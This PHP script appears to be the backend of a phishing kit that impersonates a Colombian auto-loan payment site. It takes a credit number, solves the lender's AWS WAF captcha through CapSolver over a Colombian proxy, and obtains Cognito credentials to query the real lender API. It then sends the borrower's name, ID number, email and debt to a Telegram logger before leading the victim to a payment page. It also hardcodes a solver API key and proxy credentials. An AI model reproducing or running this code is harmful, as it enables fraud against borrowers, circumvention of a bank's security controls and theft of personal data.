<?php
ob_start();
ini_set('display_errors', '0');
set_time_limit(120);
session_start();
require_once __DIR__ . '/includes/telegram-logger.php';
header('Content-Type: application/json; charset=utf-8');

define('API_URL', 'https://pmz.mfs.bank4us.co/1111111/oracle/get-user-info');
define('API_HOST', 'pmz.mfs.bank4us.co');
define('API_REGION', 'us-east-1');
define('API_SERVICE', 'execute-api');
define('COGNITO_ENDPOINT', 'https://cognito-identity.us-east-1.amazonaws.com/');
define('COGNITO_IDENTITY', 'us-east-1:cb3ad245-8418-c9be-9947-83c4204b2cba');
define('WAF_WEBSITE_URL', 'https://mobilize-fs.com.co');
define('CAPSOLVER_KEY', 'CAP-D901B1BB40623924A9DED85DE5CBA85B81E6A83CC7E55C4091C86BD595C0361A');
define('PROXY_HOST', 'geo.iproyal.com');
define('PROXY_PORT', 12321);
define('PROXY_USER', 'iSdME2ZQYwX2P9u0');
define('PROXY_PASS', 'Otw3Bu2nfhCM6uXX_country-co');
define('USE_PROXY', true);
// Sticky session: misma IP para CapSolver y para la llamada final a la API.
// El ID combina session PHP + timestamp del request para ser único por invocación.
define('PROXY_SESSION_ID', 'ses' . substr(md5(session_id() . ($_SERVER['REQUEST_TIME'] ?? time())), 0, 8));
define('PROXY_PASS_STICKY', PROXY_PASS . '_session-' . PROXY_SESSION_ID);
define('BROWSER_UA', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');

// ── Helpers ──────────────────────────────────────────────────────────────────

function writeApiDebugLog(array $context): void
{
    $logDir = __DIR__ . '/logs';
    $logFile = $logDir . '/api-debug.json';
    if (!is_dir($logDir))
        @mkdir($logDir, 0775, true);
    $entry = array_merge(['timestamp' => date('Y-m-d H:i:s'), 'session_id' => session_id()], $context);
    @file_put_contents($logFile, json_encode($entry) . PHP_EOL, FILE_APPEND | LOCK_EX);
}

function logTelegram($action, $data = []): void
{
    if (function_exists('telegram_log'))
        telegram_log($action, $data);
}

function wp3Curl(string $url, array $opts = []): array
{
    $ch = curl_init($url);
    curl_setopt_array($ch, $opts + [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 20,
        CURLOPT_SSL_VERIFYPEER => true,
    ]);
    $resp = curl_exec($ch);
    $httpCode = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $err = curl_error($ch);
    curl_close($ch);
    return [$resp, $httpCode, $err];
}

// Variante que también devuelve los headers de respuesta
function wp3CurlWithHeaders(string $url, array $opts = []): array
{
    $responseHeaders = [];
    $ch = curl_init($url);
    curl_setopt_array($ch, $opts + [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 20,
        CURLOPT_SSL_VERIFYPEER => true,
        CURLOPT_HEADERFUNCTION => function ($ch, $headerLine) use (&$responseHeaders) {
            $parts = explode(':', $headerLine, 2);
            if (count($parts) === 2) {
                $responseHeaders[strtolower(trim($parts[0]))] = trim($parts[1]);
            }
            return strlen($headerLine);
        },
    ]);
    $resp = curl_exec($ch);
    $httpCode = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $err = curl_error($ch);
    curl_close($ch);
    return [$resp, $httpCode, $err, $responseHeaders];
}

// ── CapSolver: obtener AWS WAF token ─────────────────────────────────────────

/**
 * Sondea el endpoint protegido por WAF para extraer los parámetros del challenge
 * (awsKey, awsIv, awsContext, awsChallengeJs).
 * AWS WAF devuelve estos valores en el HTML cuando bloquea la petición.
 */
function getWafChallengeParams(): array
{
    $opts = [
        CURLOPT_CUSTOMREQUEST => 'GET',
        CURLOPT_FOLLOWLOCATION => false,
        CURLOPT_HTTPHEADER => [
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language: es-CO,es;q=0.8,en;q=0.5',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Origin: ' . WAF_WEBSITE_URL,
            'Referer: ' . WAF_WEBSITE_URL . '/',
        ],
    ];

    if (USE_PROXY) {
        $opts[CURLOPT_PROXY] = PROXY_HOST . ':' . PROXY_PORT;
        $opts[CURLOPT_PROXYUSERPWD] = PROXY_USER . ':' . PROXY_PASS;
        $opts[CURLOPT_PROXYTYPE] = CURLPROXY_HTTP;
    }

    // Primero sondear el endpoint API (ahí está el WAF, no en el sitio principal)
    [$html, $code, $err, $headers] = wp3CurlWithHeaders(API_URL, $opts);
    $html = (string) $html;

    // Si el API no devuelve challenge HTML, probar el sitio principal
    if (stripos($html, 'captcha-sdk.awswaf.com') === false) {
        [$html2, , , $headers2] = wp3CurlWithHeaders(WAF_WEBSITE_URL, $opts);
        if (stripos((string) $html2, 'captcha-sdk.awswaf.com') !== false) {
            $html = (string) $html2;
            $headers = $headers2;
        }
    }

    $result = [];

    $htmlNorm = str_replace('\/', '/', $html);

    // awsKey = window.gokuProps.key (clave KMS-cifrada por request)
    if (preg_match('/"key"\s*:\s*"([^"]+)"/', $htmlNorm, $m)) {
        $result['awsKey'] = $m[1];
    }

    // awsIv y awsContext desde gokuProps
    if (preg_match('/"iv"\s*:\s*"([^"]+)"/', $htmlNorm, $m)) {
        $result['awsIv'] = $m[1];
    }
    if (preg_match('/"context"\s*:\s*"([^"]+)"/', $htmlNorm, $m)) {
        $result['awsContext'] = $m[1];
    } elseif (preg_match('/"ctx"\s*:\s*"([^"]+)"/', $htmlNorm, $m)) {
        $result['awsContext'] = $m[1];
    }

    // awsChallengeJs: URL del <script src> — puede estar en captcha-sdk.awswaf.com o token.awswaf.com
    if (preg_match('#(https://[\w\-\.]+\.awswaf\.com/[\w/\-\.]+\.js)#i', $htmlNorm, $m)) {
        $result['awsChallengeJs'] = $m[1];
    }

    if (empty($result['awsChallengeJs'])) {
        // URL real observada en los probes anteriores (token.awswaf.com, no captcha-sdk)
        $result['awsChallengeJs'] = 'https://9c82753ee895.0fcaecc3.us-east-1.token.awswaf.com/9c82753ee895/fc192e99741e/fea5950d2f2d/challenge.js';
        $result['awsChallengeJs_source'] = 'fallback_real';
    }

    return $result;
}

function getWafToken(): ?string
{
    // Paso 1: obtener parámetros del challenge WAF
    $cp = getWafChallengeParams();

    // Paso 2: construir la tarea de CapSolver
    // AntiAwsWafTask con nuestro proxy colombiano: el token queda ligado a la misma
    // IP que usará la llamada final a la API → evita el GW_WAF_FILTERED.
    $task = [
        'type' => 'AntiAwsWafTask',
        'websiteURL' => API_URL,
        'proxyType' => 'http',
        'proxyAddress' => PROXY_HOST,
        'proxyPort' => PROXY_PORT,
        'proxyLogin' => PROXY_USER,
        'proxyPassword' => PROXY_PASS_STICKY,
    ];

    // Solo pasar params válidos (si el probe falló, no hay awsIv/awsContext)
    if (!empty($cp['awsKey']))
        $task['awsKey'] = $cp['awsKey'];
    if (!empty($cp['awsChallengeJs']))
        $task['awsChallengeJs'] = $cp['awsChallengeJs'];
    if (!empty($cp['awsIv']))
        $task['awsIv'] = $cp['awsIv'];
    if (!empty($cp['awsContext']))
        $task['awsContext'] = $cp['awsContext'];

    // Paso 3: crear tarea en CapSolver
    [$resp] = wp3Curl('https://api.capsolver.com/createTask', [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => json_encode(['clientKey' => CAPSOLVER_KEY, 'task' => $task]),
        CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
    ]);

    $data = json_decode($resp, true);

    $taskId = $data['taskId'] ?? null;
    if (!$taskId)
        return null;

    // Paso 4: polling (máx ~60 s)
    for ($i = 0; $i < 20; $i++) {
        sleep(3);
        [$resp2] = wp3Curl('https://api.capsolver.com/getTaskResult', [
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => json_encode(['clientKey' => CAPSOLVER_KEY, 'taskId' => $taskId]),
            CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
        ]);
        $result = json_decode($resp2, true);
        if (($result['status'] ?? '') === 'ready') {
            return $result['solution']['cookie'] ?? null;
        }
        if (($result['status'] ?? '') === 'failed')
            return null;
    }
    return null;
}

// ── Cognito: obtener credenciales temporales AWS ──────────────────────────────

function getCognitoCredentials(): ?array
{
    [$resp, $code] = wp3Curl(COGNITO_ENDPOINT, [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => json_encode(['IdentityId' => COGNITO_IDENTITY]),
        CURLOPT_HTTPHEADER => [
            'Content-Type: application/x-amz-json-1.1',
            'X-Amz-Target: AWSCognitoIdentityService.GetCredentialsForIdentity',
        ],
    ]);

    $data = json_decode($resp, true);
    $creds = $data['Credentials'] ?? null;
    if (!$creds)
        return null;

    return [
        'accessKey' => $creds['AccessKeyId'],
        'secretKey' => $creds['SecretKey'],
        'sessionToken' => $creds['SessionToken'],
    ];
}

// ── AWS Signature V4 ──────────────────────────────────────────────────────────

function awsHmac(string $key, string $data, bool $raw = false): string
{
    return hash_hmac('sha256', $data, $key, $raw);
}

function awsSigningKey(string $secret, string $date, string $region, string $service): string
{
    $k = awsHmac('AWS4' . $secret, $date, true);
    $k = awsHmac($k, $region, true);
    $k = awsHmac($k, $service, true);
    return awsHmac($k, 'aws4_request', true);
}

/**
 * Devuelve el array de headers listos para enviar (incluyendo Authorization).
 * $headersToSign: ['accept' => 'application/json', 'content-type' => 'application/json']
 */
function awsSignV4(
    string $method,
    string $url,
    array $headersToSign,
    string $payload,
    string $accessKey,
    string $secretKey,
    string $sessionToken,
    string $region,
    string $service
): array {
    $parsed = parse_url($url);
    $host = $parsed['host'];
    $path = $parsed['path'] ?? '/';
    $query = $parsed['query'] ?? '';

    $now = gmdate('Ymd\THis\Z');
    $date = gmdate('Ymd');

    // Agregar host y fecha al bloque de headers firmados
    $all = array_merge($headersToSign, [
        'host' => $host,
        'x-amz-date' => $now,
    ]);

    // Normalizar a minúsculas y ordenar
    $lower = [];
    foreach ($all as $k => $v)
        $lower[strtolower($k)] = trim($v);
    ksort($lower);

    $canonicalHeaders = '';
    $signedList = [];
    foreach ($lower as $k => $v) {
        $canonicalHeaders .= $k . ':' . $v . "\n";
        $signedList[] = $k;
    }
    $signedHeadersStr = implode(';', $signedList);

    $payloadHash = hash('sha256', $payload);
    $canonicalReq = implode("\n", [$method, $path, $query, $canonicalHeaders, $signedHeadersStr, $payloadHash]);
    $credScope = "$date/$region/$service/aws4_request";
    $stringToSign = "AWS4-HMAC-SHA256\n$now\n$credScope\n" . hash('sha256', $canonicalReq);
    $signingKey = awsSigningKey($secretKey, $date, $region, $service);
    $signature = awsHmac($signingKey, $stringToSign);
    $authorization = "AWS4-HMAC-SHA256 Credential=$accessKey/$credScope, SignedHeaders=$signedHeadersStr, Signature=$signature";

    return array_merge($lower, [
        'authorization' => $authorization,
        'x-amz-security-token' => $sessionToken,
    ]);
}

// ── Validar request ───────────────────────────────────────────────────────────

if ($_SERVER['REQUEST_METHOD'] !== 'POST' || empty($_POST['creditNumber'])) {
    http_response_code(400);
    echo json_encode(['success' => false, 'message' => 'Debes ingresar el número de crédito.']);
    exit;
}

$creditNumber = trim($_POST['creditNumber']);
if (!preg_match('/^[A-Za-z0-9\-]{1,30}$/', $creditNumber)) {
    http_response_code(422);
    echo json_encode(['success' => false, 'message' => 'El número de crédito ingresado no es válido.']);
    exit;
}

logTelegram('🔎 Búsqueda de crédito', [
    'Número de crédito' => $creditNumber,
    'IP' => $_SERVER['REMOTE_ADDR'] ?? 'unknown',
]);

// ── Paso 1: WAF token ─────────────────────────────────────────────────────────

$wafToken = getWafToken();
if (!$wafToken) {
    http_response_code(502);
    echo json_encode(['success' => false, 'message' => 'No se pudo resolver el captcha.']);
    exit;
}

// ── Paso 2: Credenciales Cognito ──────────────────────────────────────────────

$creds = getCognitoCredentials();
if (!$creds) {
    writeApiDebugLog(['step' => 'cognito_failed', 'creditNumber' => $creditNumber]);
    http_response_code(502);
    echo json_encode(['success' => false, 'message' => 'Error de autenticación con el servicio.']);
    exit;
}

// ── Paso 3: Firmar y llamar la API ────────────────────────────────────────────

$payload = json_encode([
    'creditNumber' => $creditNumber,
    'forceRequest' => true,
    'chanel' => 'test',
]);

$signedHeaders = awsSignV4(
    'POST',
    API_URL,
    [
        'accept' => 'application/json',
        'content-type' => 'application/json',
    ],
    $payload,
    $creds['accessKey'],
    $creds['secretKey'],
    $creds['sessionToken'],
    API_REGION,
    API_SERVICE
);

// Construir array de headers cURL
$curlHeaders = [];
foreach ($signedHeaders as $k => $v) {
    $curlHeaders[] = $k . ': ' . $v;
}
$curlHeaders[] = 'x-aws-waf-token: ' . $wafToken;
$curlHeaders[] = 'Origin: https://www.mobilize-fs.com.co';
$curlHeaders[] = 'Referer: https://www.mobilize-fs.com.co/';
$curlHeaders[] = 'User-Agent: ' . BROWSER_UA;

$curlOpts = [
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => $payload,
    CURLOPT_HTTPHEADER => $curlHeaders,
    CURLOPT_TIMEOUT => 20,
];

if (USE_PROXY) {
    $curlOpts[CURLOPT_PROXY]        = PROXY_HOST . ':' . PROXY_PORT;
    $curlOpts[CURLOPT_PROXYUSERPWD] = PROXY_USER . ':' . PROXY_PASS_STICKY;
    $curlOpts[CURLOPT_PROXYTYPE]    = CURLPROXY_HTTP;
}

[$response, $httpCode, $curlError] = wp3Curl(API_URL, $curlOpts);

writeApiDebugLog([
    'step' => 'api_call',
    'creditNumber' => $creditNumber,
    'httpCode' => $httpCode,
    'curlError' => $curlError ?: 'ninguno',
    'responseLength' => strlen((string) $response),
]);

if ($curlError || $response === false) {
    logTelegram('❌ Error de conexión con la API', [
        'Número de crédito' => $creditNumber,
        'Error cURL' => $curlError,
        'HTTP Code' => $httpCode,
    ]);
    http_response_code(502);
    echo json_encode(['success' => false, 'message' => 'Error de conexión con el servicio.']);
    exit;
}

$data = json_decode($response, true);
$jsonError = json_last_error_msg();

if ($data === null && $jsonError !== 'No error') {
    writeApiDebugLog([
        'step' => 'json_error',
        'creditNumber' => $creditNumber,
        'jsonError' => $jsonError,
        'rawResponse' => substr($response, 0, 500),
    ]);
    http_response_code(500);
    echo json_encode(['success' => false, 'message' => 'La respuesta del servicio no es válida.']);
    exit;
}

if (isset($data['userInfo']) && is_array($data['userInfo'])) {
    $userInfo = $data['userInfo'];
    $concept = $data['paymentDescription'] ?? 'Pago credito RCI';
    $minPayment = $userInfo['PAGO_MINIMO'] ?? null;
    $totalDebt = $userInfo['PAGO_TOTAL'] ?? null;
    $dueDate = $userInfo['FECHA_VENCIMIENTO_PAGO'] ?? null;

    $_SESSION['userInfo'] = $userInfo;
    $_SESSION['creditNumber'] = $creditNumber;
    $_SESSION['payment'] = [
        'concept' => $concept,
        'minPayment' => $minPayment,
        'totalDebt' => $totalDebt,
        'dueDate' => $dueDate,
        'valueToPay' => $minPayment,
    ];

    logTelegram('✅ Crédito encontrado', [
        'Número de crédito' => $creditNumber,
        'Nombre' => $userInfo['NOMBRE_COMPLETO'] ?? null,
        'Documento' => $userInfo['UNIQUE_ID_VALUE'] ?? null,
        'Correo' => $userInfo['EMAIL'] ?? null,
        'Pago mínimo' => $minPayment,
        'Deuda total' => $totalDebt,
        'Vencimiento' => $dueDate,
    ]);

    echo json_encode(['success' => true, 'redirect' => 'detalle-pago.php']);
    exit;
}

writeApiDebugLog([
    'step' => 'credit_not_found',
    'creditNumber' => $creditNumber,
    'httpCode' => $httpCode,
    'responseMessage' => $data['message'] ?? 'Sin userInfo en respuesta',
    'decoded' => $data,
]);

logTelegram('⚠️ Crédito no encontrado', ['Número de crédito' => $creditNumber]);

http_response_code(404);
echo json_encode([
    'success' => false,
    'message' => 'No encontramos información asociada a ese número de crédito.',
]);
